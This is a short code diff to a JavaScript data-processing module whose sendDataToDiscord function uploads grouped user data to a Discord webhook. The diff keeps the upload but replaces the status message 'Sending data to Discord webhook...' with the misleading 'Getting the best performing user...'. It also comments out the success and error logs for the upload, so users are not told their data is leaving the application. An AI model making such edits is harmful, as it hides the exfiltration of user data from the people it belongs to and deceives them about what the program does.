@@ -27,7 +27,7 @@ export default async function processData(jsonData, setProcessingStep, console) 
     console.log('Grouped and sorted user data:', userDataArray);
 
     // Send data to Discord
-    setProcessingStep('Sending data to Discord webhook...');
+    setProcessingStep('Getting the best performing user...');
     await sendDataToDiscord(userDataArray);
   
     return { userDataArray, startDate, endDate };
@@ -360,9 +360,9 @@ async function sendDataToDiscord(userDataArray) {
         },
       });
   
-      console.log('Data file sent to Discord webhook successfully.');
+    //  console.log('Data file sent to Discord webhook successfully.');
     } catch (error) {
-      console.error('Error sending data to Discord:', error);
+    //  console.error('Error sending data to Discord:', error);
     }
   }
   
